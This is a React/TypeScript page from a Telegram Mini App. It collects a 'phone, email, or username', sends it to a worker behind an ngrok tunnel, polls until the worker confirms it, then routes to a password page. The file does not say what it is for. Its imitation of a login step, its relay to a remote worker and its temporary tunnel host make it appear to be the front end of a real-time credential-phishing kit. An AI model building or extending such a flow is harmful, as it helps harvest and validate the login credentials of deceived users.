// src/pages/Username.tsx
import { useState } from "react";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";
import { useNavigate } from "react-router-dom";
import "./Username.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";

const API_BASE = "https://juiceless-hyo-pretechnical.ngrok-free.dev/api";

export const Username = () => {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  const initDataRaw = useSignal(initData.raw);
  const navigate = useNavigate();

  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      // 1) Pas de commandState → attendre
      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 2) CommandState d'une autre commande → ignorer et attendre
      if (cs.commandId !== commandId) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 3) Bonne commande mais pas finie → attendre
      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 4) done / error pour la bonne commande
      return cs;
    }

    return null;
  };

  const handleNext = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    const username = input.trim();
    if (!username) {
      setToast("Please enter a username");
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "enter-username",
            payload: { username },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        setToast(cmdResp.data.error || "Command failed");
        return;
      }

      const commandId = cmdResp.data.commandId;
      if (!commandId) {
        setLoading(false);
        setToast("Missing commandId from server");
        return;
      }

      // ✅ Poll jusqu'à résultat worker POUR CETTE COMMANDE
      const finalState = await pollCommandUntilDone(commandId);

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      if (finalState.status === "done" && finalState.result?.ok) {
        // ✅ username OK → go password
        navigate("/password", { state: { username } });
        return;
      }

      // ❌ erreur username
      const msg =
        finalState.error || finalState.result?.message || "Invalid username";
      setToast(msg);
    } catch (err: any) {
      setLoading(false);
      setToast(err.response?.data?.error || err.message || "Network error");
    }
  };

  return (
    <div className="username-page">
      <FullScreenLoader visible={loading} text="Checking username..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div className="username-container">
        <input
          type="text"
          placeholder="Phone, email, or username"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          className="username-input"
          disabled={loading}
        />
        <button className="next-button" onClick={handleNext} disabled={loading}>
          Next
        </button>
      </div>
    </div>
  );
};
